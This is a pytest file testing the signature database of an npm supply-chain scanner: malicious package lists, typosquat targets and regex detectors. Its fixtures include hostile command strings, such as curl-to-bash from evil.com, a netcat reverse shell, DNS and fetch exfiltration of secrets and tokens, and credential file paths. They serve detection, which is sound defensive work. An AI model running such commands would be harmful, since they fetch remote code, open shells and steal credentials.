"""Tests for npm_shield/patterns.py — the static pattern database.

Verifies that:
- All data structures are correctly formed and internally consistent.
- Regex patterns compile and match/reject expected inputs.
- Severity ranking is monotonically ordered.
- Public API surface (__all__) is consistent with module contents.
"""

from __future__ import annotations

import re

import pytest

from npm_shield.patterns import (
    COMMON_INTERNAL_NAME_PREFIXES,
    CREDENTIAL_HARVESTING_SIGNATURES,
    DEP_CONFUSION_HIGH_VERSION_THRESHOLD,
    DEP_CONFUSION_VERSION_PATTERN,
    GIT_HOOK_MALICIOUS_PATTERNS,
    GIT_HOOK_SAMPLE_SUFFIXES,
    KNOWN_MALICIOUS_BY_NAME,
    KNOWN_MALICIOUS_NAMES,
    KNOWN_MALICIOUS_PACKAGES,
    LEGITIMATE_MCP_PACKAGES,
    LEGITIMATE_PACKAGE_NAMES,
    MCP_DECLARATION_PATTERNS,
    MCP_SERVER_NAME_KEYWORDS,
    REMEDIATION_TEMPLATES,
    SCANNABLE_EXTENSIONS,
    STANDARD_GIT_HOOKS,
    SUSPICIOUS_SCRIPT_PATTERNS,
    TYPOSQUAT_TARGETS,
    KnownMaliciousPackage,
    RegexSignature,
    Severity,
    TyposquatTarget,
    severity_rank,
)


# ---------------------------------------------------------------------------
# Severity
# ---------------------------------------------------------------------------


class TestSeverity:
    """Tests for the Severity enum and severity_rank helper."""

    def test_all_levels_defined(self) -> None:
        levels = {s.value for s in Severity}
        assert "info" in levels
        assert "low" in levels
        assert "medium" in levels
        assert "high" in levels
        assert "critical" in levels

    def test_severity_rank_ordering(self) -> None:
        assert severity_rank("info") < severity_rank("low")
        assert severity_rank("low") < severity_rank("medium")
        assert severity_rank("medium") < severity_rank("high")
        assert severity_rank("high") < severity_rank("critical")

    def test_severity_rank_unknown(self) -> None:
        assert severity_rank("unknown") == -1
        assert severity_rank("") == -1

    def test_severity_rank_case_insensitive(self) -> None:
        assert severity_rank("CRITICAL") == severity_rank("critical")
        assert severity_rank("HIGH") == severity_rank("high")
        assert severity_rank("Medium") == severity_rank("medium")

    def test_severity_string_values(self) -> None:
        """Severity values must be lowercase strings for report serialisation."""
        for sev in Severity:
            assert sev.value == sev.value.lower()


# ---------------------------------------------------------------------------
# KnownMaliciousPackage
# ---------------------------------------------------------------------------


class TestKnownMaliciousPackages:
    """Tests for the KNOWN_MALICIOUS_PACKAGES database."""

    def test_non_empty(self) -> None:
        assert len(KNOWN_MALICIOUS_PACKAGES) > 0

    def test_all_are_dataclass_instances(self) -> None:
        for pkg in KNOWN_MALICIOUS_PACKAGES:
            assert isinstance(pkg, KnownMaliciousPackage)

    def test_all_have_non_empty_names(self) -> None:
        for pkg in KNOWN_MALICIOUS_PACKAGES:
            assert isinstance(pkg.name, str)
            assert len(pkg.name.strip()) > 0, f"Empty name in {pkg}"

    def test_all_versions_are_strings(self) -> None:
        for pkg in KNOWN_MALICIOUS_PACKAGES:
            assert isinstance(pkg.versions, tuple)
            for v in pkg.versions:
                assert isinstance(v, str)

    def test_all_severities_valid(self) -> None:
        valid = {s.value for s in Severity}
        for pkg in KNOWN_MALICIOUS_PACKAGES:
            assert pkg.severity in valid, (
                f"{pkg.name} has invalid severity '{pkg.severity}'"
            )

    def test_all_have_descriptions(self) -> None:
        for pkg in KNOWN_MALICIOUS_PACKAGES:
            assert isinstance(pkg.description, str)
            assert len(pkg.description) > 0, f"{pkg.name} has no description"

    def test_known_bad_names_set_matches_packages(self) -> None:
        expected = {p.name for p in KNOWN_MALICIOUS_PACKAGES}
        assert KNOWN_MALICIOUS_NAMES == expected

    def test_by_name_index_covers_all_packages(self) -> None:
        for pkg in KNOWN_MALICIOUS_PACKAGES:
            assert pkg.name in KNOWN_MALICIOUS_BY_NAME
            assert pkg in KNOWN_MALICIOUS_BY_NAME[pkg.name]

    def test_specific_known_bad_packages(self) -> None:
        """A spot-check of packages that must be in the database."""
        must_have = [
            "event-stream",
            "flatmap-stream",
            "crossenv",
            "ua-parser-js",
            "node-ipc",
            "eslint-scope",
        ]
        for name in must_have:
            assert name in KNOWN_MALICIOUS_NAMES, f"{name!r} not in KNOWN_MALICIOUS_NAMES"

    def test_event_stream_version_pinned(self) -> None:
        packages = KNOWN_MALICIOUS_BY_NAME.get("event-stream", [])
        assert len(packages) > 0
        pkg = packages[0]
        assert "3.3.6" in pkg.versions

    def test_frozen_dataclass_immutable(self) -> None:
        pkg = KNOWN_MALICIOUS_PACKAGES[0]
        with pytest.raises(Exception):
            pkg.name = "tampered"  # type: ignore[misc]


# ---------------------------------------------------------------------------
# TyposquatTarget
# ---------------------------------------------------------------------------


class TestTyposquatTargets:
    """Tests for the TYPOSQUAT_TARGETS list."""

    def test_non_empty(self) -> None:
        assert len(TYPOSQUAT_TARGETS) > 0

    def test_all_are_dataclass_instances(self) -> None:
        for t in TYPOSQUAT_TARGETS:
            assert isinstance(t, TyposquatTarget)

    def test_all_have_non_empty_names(self) -> None:
        for t in TYPOSQUAT_TARGETS:
            assert isinstance(t.name, str)
            assert len(t.name.strip()) > 0

    def test_max_edit_distances_positive(self) -> None:
        for t in TYPOSQUAT_TARGETS:
            assert t.max_edit_distance >= 1, (
                f"{t.name} has max_edit_distance={t.max_edit_distance}"
            )

    def test_weekly_downloads_positive(self) -> None:
        for t in TYPOSQUAT_TARGETS:
            assert t.weekly_downloads_approx > 0

    def test_legitimate_names_set_matches_targets(self) -> None:
        expected = {t.name for t in TYPOSQUAT_TARGETS}
        assert LEGITIMATE_PACKAGE_NAMES == expected

    def test_popular_packages_present(self) -> None:
        must_have = ["lodash", "express", "react", "axios", "webpack"]
        for name in must_have:
            assert name in LEGITIMATE_PACKAGE_NAMES, f"{name!r} not in targets"

    def test_no_duplicates(self) -> None:
        names = [t.name for t in TYPOSQUAT_TARGETS]
        assert len(names) == len(set(names)), "Duplicate target names found"


# ---------------------------------------------------------------------------
# RegexSignature
# ---------------------------------------------------------------------------


class TestRegexSignature:
    """Tests for RegexSignature named tuple structure."""

    def test_credential_signatures_non_empty(self) -> None:
        assert len(CREDENTIAL_HARVESTING_SIGNATURES) > 0

    def test_suspicious_script_signatures_non_empty(self) -> None:
        assert len(SUSPICIOUS_SCRIPT_PATTERNS) > 0

    def test_git_hook_signatures_non_empty(self) -> None:
        assert len(GIT_HOOK_MALICIOUS_PATTERNS) > 0

    def test_mcp_declaration_signatures_non_empty(self) -> None:
        assert len(MCP_DECLARATION_PATTERNS) > 0

    def _check_signatures(self, sigs: tuple) -> None:
        """Assert all entries in a signature tuple are well-formed."""
        valid_severities = {s.value for s in Severity}
        for sig in sigs:
            assert isinstance(sig, RegexSignature), f"{sig!r} is not a RegexSignature"
            assert isinstance(sig.pattern, re.Pattern), (
                f"{sig.name!r} pattern is not compiled"
            )
            assert isinstance(sig.name, str) and sig.name, (
                f"{sig!r} has no name"
            )
            assert sig.severity in valid_severities, (
                f"{sig.name!r} has invalid severity '{sig.severity}'"
            )
            assert isinstance(sig.description, str) and sig.description, (
                f"{sig.name!r} has no description"
            )

    def test_all_credential_signatures_well_formed(self) -> None:
        self._check_signatures(CREDENTIAL_HARVESTING_SIGNATURES)

    def test_all_script_signatures_well_formed(self) -> None:
        self._check_signatures(SUSPICIOUS_SCRIPT_PATTERNS)

    def test_all_git_hook_signatures_well_formed(self) -> None:
        self._check_signatures(GIT_HOOK_MALICIOUS_PATTERNS)

    def test_all_mcp_signatures_well_formed(self) -> None:
        self._check_signatures(MCP_DECLARATION_PATTERNS)


# ---------------------------------------------------------------------------
# Credential harvesting patterns — match tests
# ---------------------------------------------------------------------------


class TestCredentialHarvestingPatterns:
    """Validate that credential harvesting signatures match malicious code examples."""

    def _find_sig(self, name: str) -> RegexSignature:
        for sig in CREDENTIAL_HARVESTING_SIGNATURES:
            if sig.name == name:
                return sig
        pytest.fail(f"Signature {name!r} not found")

    def test_eval_obfuscated_payload_matches(self) -> None:
        sig = self._find_sig("eval-obfuscated-payload")
        assert sig.pattern.search("eval(Buffer.from('aGVsbG8=', 'base64').toString())")
        assert sig.pattern.search("eval(atob(encodedPayload))")
        assert not sig.pattern.search("console.log('hello')")

    def test_credential_file_access_matches(self) -> None:
        sig = self._find_sig("credential-file-access")
        assert sig.pattern.search("/home/user/.npmrc")
        assert sig.pattern.search("path.join(os.homedir(), '.aws')")
        assert not sig.pattern.search("path.join(__dirname, 'README.md')")

    def test_reverse_shell_matches(self) -> None:
        sig = self._find_sig("reverse-shell-command")
        code = "require('child_process').exec('bash -c \"curl http://evil.com | bash\"')"
        assert sig.pattern.search(code)

    def test_dns_exfiltration_matches(self) -> None:
        sig = self._find_sig("dns-exfiltration")
        assert sig.pattern.search(
            "dns.resolve(Buffer.from(process.env.SECRET, 'base64') + '.evil.com')"
        )

    def test_ci_secret_exfiltration_matches(self) -> None:
        sig = self._find_sig("ci-secret-exfiltration")
        assert sig.pattern.search(
            "fetch('http://evil.com', { body: GITHUB_TOKEN })"
        )
        assert sig.pattern.search(
            "request.post({ body: NPM_TOKEN })"
        )


# ---------------------------------------------------------------------------
# Suspicious script patterns — match tests
# ---------------------------------------------------------------------------


class TestSuspiciousScriptPatterns:
    """Validate suspicious lifecycle script signatures."""

    def _find_sig(self, name: str) -> RegexSignature:
        for sig in SUSPICIOUS_SCRIPT_PATTERNS:
            if sig.name == name:
                return sig
        pytest.fail(f"Signature {name!r} not found")

    def test_curl_pipe_shell_matches(self) -> None:
        sig = self._find_sig("curl-pipe-shell")
        assert sig.pattern.search("curl http://evil.com/payload.sh | bash")
        assert sig.pattern.search("curl -s https://evil.com/install | sh")
        assert not sig.pattern.search("curl http://example.com")

    def test_wget_pipe_shell_matches(self) -> None:
        sig = self._find_sig("wget-pipe-shell")
        assert sig.pattern.search("wget -q -O- http://evil.com | bash")

    def test_base64_decode_pipe_shell_matches(self) -> None:
        sig = self._find_sig("base64-decode-pipe-shell")
        assert sig.pattern.search("echo 'YmFzaA==' | base64 -d | bash")
        assert sig.pattern.search("base64 -d payload.b64 | node")

    def test_git_hook_injection_matches(self) -> None:
        sig = self._find_sig("git-hook-injection-via-script")
        assert sig.pattern.search("cp malicious.sh .git/hooks/pre-commit")
        assert sig.pattern.search(r"copy payload.bat .git\hooks\post-merge")

    def test_remote_download_matches(self) -> None:
        sig = self._find_sig("remote-download-in-script")
        assert sig.pattern.search("curl https://evil.com/binary")
        assert sig.pattern.search("wget -O file.tar.gz http://evil.com/archive")
        # Should NOT match without a URL
        assert not sig.pattern.search("curl --help")


# ---------------------------------------------------------------------------
# Git hook malicious patterns — match tests
# ---------------------------------------------------------------------------


class TestGitHookMaliciousPatterns:
    """Validate git hook malicious content signatures."""

    def _find_sig(self, name: str) -> RegexSignature:
        for sig in GIT_HOOK_MALICIOUS_PATTERNS:
            if sig.name == name:
                return sig
        pytest.fail(f"Signature {name!r} not found")

    def test_curl_pipe_matches(self) -> None:
        sig = self._find_sig("git-hook-curl-pipe")
        assert sig.pattern.search("curl http://evil.com/backdoor.sh | bash")
        assert not sig.pattern.search("curl http://example.com")

    def test_netcat_matches(self) -> None:
        sig = self._find_sig("git-hook-netcat")
        assert sig.pattern.search("nc -e /bin/sh 192.168.1.1 4444")
        assert sig.pattern.search("ncat -lvp 9001")

    def test_remote_download_matches(self) -> None:
        sig = self._find_sig("git-hook-remote-download")
        assert sig.pattern.search("wget https://evil.com/payload")
        assert sig.pattern.search("curl http://attacker.net/hook")


# ---------------------------------------------------------------------------
# Standard Git hooks set
# ---------------------------------------------------------------------------


class TestStandardGitHooks:
    def test_common_hooks_present(self) -> None:
        expected = [
            "pre-commit",
            "commit-msg",
            "post-merge",
            "pre-push",
            "post-checkout",
            "prepare-commit-msg",
        ]
        for hook in expected:
            assert hook in STANDARD_GIT_HOOKS, f"{hook!r} missing from STANDARD_GIT_HOOKS"

    def test_sample_suffixes_non_empty(self) -> None:
        assert len(GIT_HOOK_SAMPLE_SUFFIXES) > 0
        assert ".sample" in GIT_HOOK_SAMPLE_SUFFIXES


# ---------------------------------------------------------------------------
# MCP indicators
# ---------------------------------------------------------------------------


class TestMCPIndicators:
    def test_mcp_keywords_non_empty(self) -> None:
        assert len(MCP_SERVER_NAME_KEYWORDS) > 0

    def test_mcp_keywords_are_lowercase(self) -> None:
        for kw in MCP_SERVER_NAME_KEYWORDS:
            assert kw == kw.lower(), f"{kw!r} is not lowercase"

    def test_legitimate_mcp_packages_non_empty(self) -> None:
        assert len(LEGITIMATE_MCP_PACKAGES) > 0

    def test_mcp_declaration_patterns_match_json(self) -> None:
        """MCP JSON field patterns should match relevant package.json snippets."""
        mcp_json_snippet = '"mcpServer": {"transport": "stdio"}'
        mcp_json_sig = next(
            (s for s in MCP_DECLARATION_PATTERNS if s.name == "mcp-json-field"), None
        )
        assert mcp_json_sig is not None
        assert mcp_json_sig.pattern.search(mcp_json_snippet)


# ---------------------------------------------------------------------------
# Dependency confusion constants
# ---------------------------------------------------------------------------


class TestDepConfusion:
    def test_version_threshold_positive(self) -> None:
        assert DEP_CONFUSION_HIGH_VERSION_THRESHOLD > 0

    def test_version_pattern_matches_semver(self) -> None:
        m = DEP_CONFUSION_VERSION_PATTERN.match("9999.0.0")
        assert m is not None
        assert int(m.group("major")) == 9999

    def test_version_pattern_rejects_invalid(self) -> None:
        assert DEP_CONFUSION_VERSION_PATTERN.match("not-a-version") is None

    def test_internal_prefixes_non_empty(self) -> None:
        assert len(COMMON_INTERNAL_NAME_PREFIXES) > 0


# ---------------------------------------------------------------------------
# Remediation templates
# ---------------------------------------------------------------------------


class TestRemediationTemplates:
    def test_required_keys_present(self) -> None:
        required = [
            "typosquatting",
            "known-malicious",
            "git-hook",
            "credential-harvesting",
            "mcp-server",
            "suspicious-script",
            "rogue-binary",
            "dep-confusion",
            "osv-vulnerability",
        ]
        for key in required:
            assert key in REMEDIATION_TEMPLATES, (
                f"Remediation template for {key!r} is missing"
            )

    def test_all_templates_are_non_empty_strings(self) -> None:
        for key, template in REMEDIATION_TEMPLATES.items():
            assert isinstance(template, str)
            assert len(template.strip()) > 0, f"Template for {key!r} is empty"

    def test_templates_contain_numbered_steps(self) -> None:
        """Each template should have at least step '1.' to guide the user."""
        for key, template in REMEDIATION_TEMPLATES.items():
            assert "1." in template, f"Template for {key!r} has no step 1"


# ---------------------------------------------------------------------------
# File scanning configuration
# ---------------------------------------------------------------------------


class TestScanConfig:
    def test_scannable_extensions_non_empty(self) -> None:
        assert len(SCANNABLE_EXTENSIONS) > 0

    def test_extensions_start_with_dot(self) -> None:
        for ext in SCANNABLE_EXTENSIONS:
            assert ext.startswith("."), f"{ext!r} does not start with '.'"

    def test_js_extensions_present(self) -> None:
        for ext in (".js", ".mjs", ".cjs", ".ts"):
            assert ext in SCANNABLE_EXTENSIONS
